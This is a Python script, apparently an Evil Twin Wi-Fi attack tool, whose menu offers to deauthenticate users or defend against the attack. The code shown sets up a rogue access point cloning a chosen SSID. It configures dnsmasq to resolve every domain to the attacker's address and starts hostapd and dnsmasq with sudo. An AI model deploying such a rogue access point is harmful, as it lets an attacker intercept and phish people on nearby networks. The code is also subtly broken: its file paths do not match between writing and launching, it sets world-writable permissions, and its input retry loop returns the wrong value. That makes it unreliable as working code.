import time
from scapy.all import *
import os



def get_type():
    result = int(input("Choose the type of action to run:\n1- Attack and de-authenticate user from AP\n2- Defend from "
                       "Evil Twin Attack\n3- Exit\n\n"))
    if result not in [1, 2, 3]:
        print("Wrong input, please try again!")
        get_type()
    return result


def scan_channels(iface, channel):
    print(f"Currently scanning for AP's in channel: {channel}")
    os.system(f"sudo iwconfig {iface} channel {channel}")


def create_hostapd_file(iface, ssid):
    interface = f"interface={str(iface)}\n"
    driver = "driver=nl80211\n"
    ssid = f"ssid={str(ssid)}\n"
    channel = "channel=1\n"
    conf_data = interface + driver + ssid + channel
    with open("conf_files/hostapd.conf", 'w+') as conf_file:
        conf_file.write(conf_data)
    os.chmod("hostapd.conf", 0o777)


def create_dnsmasq_file(iface):
    iface = f"interface={str(iface)}\n"
    body = "dhcp-range=10.0.0.3,10.0.0.100,12h\n\
            dhcp-option=3,10.0.0.1\n\
            dhcp-option=6,10.0.0.1\n\
            address=/#/10.0.0.1"
    
    conf_data = iface + body
    with open("conf_files/dnsmasq.conf", 'w+') as conf_file:
        conf_file.write(conf_data)
    os.chmod("dnsmasq.conf",0o777)

def delete_conf_files():
    os.system("rm conf_files/*.conf")

# Start and run AP connection using built conf hostapd and dnsmasq files
def start_ap():
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")
    os.system("sudo killall dnsmasq")
    os.system("sudo killall hostapd")
    os.system("sudo hostapd hostapd.conf -B")
    os.system("sudo dnsmasq -C dnsmasq.conf")

def stop_ap():
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")
    os.system("sudo killall dnsmasq")
    os.system("sudo killall hostapd")

